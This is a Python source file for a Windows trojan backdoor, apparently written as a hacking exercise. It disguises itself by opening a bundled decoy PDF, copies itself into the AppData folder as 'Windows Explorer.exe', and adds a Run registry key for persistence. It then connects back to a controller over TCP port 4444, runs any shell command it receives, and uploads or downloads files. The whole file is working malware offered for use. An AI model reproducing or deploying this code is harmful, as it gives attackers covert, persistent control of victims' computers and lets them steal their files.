#!/usr/bin/env python

import socket
import subprocess, json, os
import base64
import sys
import shutil # use de copy file in python

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # AF_INET is family of socket, SOCK_STREAM is a TCP Port
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def become_persistent(self):
        evil_file_location = os.environ['appdata'] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location) # sys.executable point to the created executable file
            subprocess.call('reg add HKCU\Software\Windows\Windows\CurrentVersion\Run /v update /t REG_SZ /d"'+ evil_file_location+'"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data) # serialize or pack object into a box(json_data) as a stream
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] changing working directory to "+ path

    def read_file(self, path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read()) # to encode unknown characters to known characters

    def write_file(self, path, content):
         with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] upload successful"

    def run(self):
        # connection.send("\n[+] connection has been established\n")
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1],command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result)

file_name = sys._MEIPASS + "\sample.pdf" # sys._MEIPASS represent the default location of the trojan created by pyinstaller
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("127.0.0.1", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()




